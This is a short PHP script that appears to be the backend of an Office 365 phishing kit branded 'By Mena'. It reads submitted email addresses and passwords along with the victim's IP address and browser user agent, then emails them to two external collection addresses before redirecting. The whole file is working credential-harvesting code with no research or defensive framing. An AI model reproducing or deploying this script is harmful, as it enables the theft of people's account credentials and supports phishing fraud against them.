<?php
if($_POST['email'] != "" and $_POST['passwd'] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| IN GOD WE TRUST|--------------|\n";
$message .= "Online ID            : ".$_POST['email']."\n";
$message .= "Passcode              : ".$_POST['passwd']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- Mena [.] RU --------------|\n";
$send = "saleslogs@protonmail.com,menalogs.details@yandex.com";
$subject = "Office 365 Microsoft By Mena | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: ");
}

?>



